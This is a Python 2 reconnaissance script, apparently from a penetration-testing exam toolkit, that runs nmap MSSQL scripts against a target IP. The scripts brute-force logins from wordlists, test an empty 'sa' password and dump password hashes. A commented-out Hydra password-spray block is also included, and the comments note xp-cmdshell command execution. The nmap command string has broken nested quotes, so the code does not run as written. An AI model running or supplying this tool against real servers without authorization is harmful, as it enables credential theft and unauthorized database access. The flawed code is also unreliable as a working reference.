#!/usr/bin/env python
import subprocess
import sys

if len(sys.argv) != 3:
    print "Usage: mysqlrecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

#NSE Documentation
#Running
#ms-sql-brute: brute
#ms-sql-dac: queries for the DAC (admin) port of an instance
#ms-sql-dump-hashes: dump hashes in format for john. requires admin. 
#ms-sql-empty-password: attempts to auth using empty password for the 'sa' account.
#ms-sql-info: query browser server (UDP 1434) for info. no auth required.
#ms-sql-ntlm-info: enum info from services with NTLM auth enabled


#Not Running
#ms-sql-config: queries for databases, linked servers, settings. auth required.
#ms-sql-hasdbaccess: queries for list of databases a user has access to. auth required.
#ms-sql-query: runs a query against server. auth required.
#ms-sql-tables: queries for a list of tables per database. auth required.
#ms-sql-xp-cmdshell: runs a command. requires admin. args 'username''password''cmd'

print "INFO: Performing nmap MSSQL script scan for %s:%s" % (ip_address, port)
MSSQLSCAN = "nmap -n -sV -Pn -vv -p %s --script=ms-sql-empty-password,ms-sql-brute,ms-sql-dac,ms-sql-dump-hashes,ms-sql-info,ms-sql-ntlm-info,vulners --script-args "userdb='/root/lists/userlist_sqlbrute.txt',passdb='/root/lists/quick_password_spray.txt'" -oN '/root/scripts/recon_enum/results/exam/mssql/%s_mssql.nmap' %s" % (port, ip_address, ip_address)
results = subprocess.check_output(MSSQLSCAN, shell=True)
outfile = "/root/scripts/recon_enum/results/exam/mssql/%s_mssqlrecon.txt" % (ip_address)
f = open(outfile, "w")
f.write(results)
f.close

#nmap currently performs brute because it can pass to useful nmap scripts
#uncomment to perform Hydra.

#Hydra meant to do weak brute/spray, not extensive
#run manually for extensive brute
# print "INFO: Performing hydra mssql scan against %s" % (ip_address)
# HYDRA = "hydra -L /usr/share/wordlists/lists/userlist_sqlbrute.txt -P /usr/share/wordlists/lists/quick_password_spray.txt -f -o /root/scripts/recon_enum/results/exam/mssql/%s_mssqlhydra.txt -u %s -s %s mssql" % (ip_address, ip_address, port)
# try:
    # results = subprocess.check_output(HYDRA, shell=True)
    # resultarr = results.split("\n")
    # for result in resultarr:
        # if "login:" in result:
	    # print "[*] Valid mssql credentials found: " + result 
# except:
    # print "INFO: No valid mssql credentials found"
